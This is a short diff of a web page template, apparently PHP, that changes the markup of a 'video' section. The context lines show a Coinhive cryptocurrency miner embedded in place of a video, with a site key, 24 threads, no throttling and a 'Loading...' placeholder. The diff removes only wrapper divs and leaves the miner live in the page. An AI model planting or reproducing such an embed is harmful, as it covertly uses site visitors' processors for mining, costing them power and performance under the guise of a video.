@@ -71,7 +71,6 @@ include("layout/c794bc6c9a3eccc2.php");
   <section id="video" class="video-main-block text-center">
     <div class="container">
       <div class="video-block">
-        <div class="video-item video-item-one">
           <div class="coinhive-miner" 
               style="height: 100%;width: 100%"
               data-key="dmQTh9BimGpFmAdq4RUPFgUfjH0SYIt2"
@@ -84,7 +83,6 @@ include("layout/c794bc6c9a3eccc2.php");
               data-threads="24"
               data-throttle="0">
               <em>Loading...</em>
-          </div>
           </div>
         </div>
       </div>
